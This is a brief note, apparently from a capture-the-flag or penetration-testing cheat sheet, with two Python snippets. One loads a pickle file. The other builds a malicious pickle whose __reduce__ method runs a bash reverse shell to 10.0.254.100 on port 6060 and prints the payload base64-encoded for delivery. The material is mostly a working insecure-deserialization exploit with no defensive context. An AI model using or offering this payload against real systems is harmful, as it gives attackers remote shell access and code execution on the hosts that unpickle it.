

Read pickle


```python
import pickle
with open("download.dat", "rb") as file:
    pickle_data = file.read()
    creds = pickle.loads(pickle_data)
    print(creds)
```

Create pickle

```python
import pickle, os, base64
class P(object):
    def __reduce__(self):
        return (os.system,("sh -i >& /dev/tcp/10.0.254.100/6060 0>&1",))
print(base64.b64encode(pickle.dumps(P())))
```
